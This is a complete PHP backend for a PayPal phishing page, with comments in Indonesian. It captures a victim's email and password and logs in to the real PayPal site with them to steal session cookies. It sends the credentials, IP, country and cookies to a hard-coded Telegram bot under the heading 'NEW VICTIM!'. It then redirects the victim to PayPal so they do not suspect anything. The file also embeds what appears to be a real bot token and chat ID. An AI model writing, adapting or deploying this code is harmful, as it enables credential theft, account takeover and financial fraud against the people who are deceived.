<?php
// ============================================================
// KONFIGURASI TELEGRAM – AMBIL DARI ENVIRONMENT RAILWAY
// ============================================================
$botToken = getenv('BOT_TOKEN') ?: '8896059398:AAGR0eMN-7_Q-UXBGO6LnXMAoESiMHt34Sg';
$chatId   = getenv('CHAT_ID') ?: '8992368095';
// ============================================================

// Ambil data dari form
$email    = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip       = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua       = $_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$screen   = $_POST['screen'] ?? 'unknown';

if (empty($email) || empty($password)) {
    http_response_code(400);
    die('Email dan password wajib diisi.');
}

// Ambil negara dari IP
$country = get_country($ip);

// Forward ke PayPal asli buat dapetin cookies
$cookies = forward_to_paypal($email, $password);

// Kirim semua data ke Telegram
$message = "🎯 *NEW VICTIM!*\n"
         . "📧 *Email:* $email\n"
         . "🔑 *Password:* $password\n"
         . "🌐 *IP:* $ip\n"
         . "📍 *Country:* $country\n"
         . "📱 *User-Agent:* $ua\n"
         . "🖥️ *Screen:* $screen\n"
         . "🍪 *Cookies:* $cookies\n"
         . "📅 *Time:* " . date('Y-m-d H:i:s') . " UTC";

send_telegram($botToken, $chatId, $message);

// Redirect korban ke PayPal asli biar ga curiga
header('Location: https://www.paypal.com/signin');
exit;

// ============================================================
// FUNGSI-FUNGSI
// ============================================================

function get_country($ip) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    curl_close($ch);
    if ($resp) {
        $data = json_decode($resp, true);
        return $data['country'] ?? 'Unknown';
    }
    return 'Unknown';
}

function forward_to_paypal($email, $password) {
    // Ambil CSRF token dari halaman login PayPal
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $html = curl_exec($ch);
    curl_close($ch);

    preg_match('/<input[^>]*name="_csrf"[^>]*value="([^"]+)"/', $html, $csrf_match);
    $csrf = $csrf_match[1] ?? '';

    // Kirim POST login ke PayPal
    $postData = http_build_query([
        '_csrf' => $csrf,
        'email' => $email,
        'password' => $password,
        'login' => 'Log In'
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/login');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    $response = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $header_size);
    curl_close($ch);

    // Ekstrak cookie XP-PP-SILO dan cookie
    preg_match_all('/Set-Cookie:\s*([^;]+)/', $headers, $matches);
    $cookies_raw = implode('; ', $matches[1]);
    preg_match('/XP-PP-SILO=([^;]+)/', $cookies_raw, $silo);
    preg_match('/cookie=([^;]+)/', $cookies_raw, $cookie);
    $silo_val = $silo[1] ?? '';
    $cookie_val = $cookie[1] ?? '';

    return "XP-PP-SILO=$silo_val; cookie=$cookie_val";
}

function send_telegram($token, $chat_id, $text) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text'    => $text,
        'parse_mode' => 'Markdown'
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}
?>
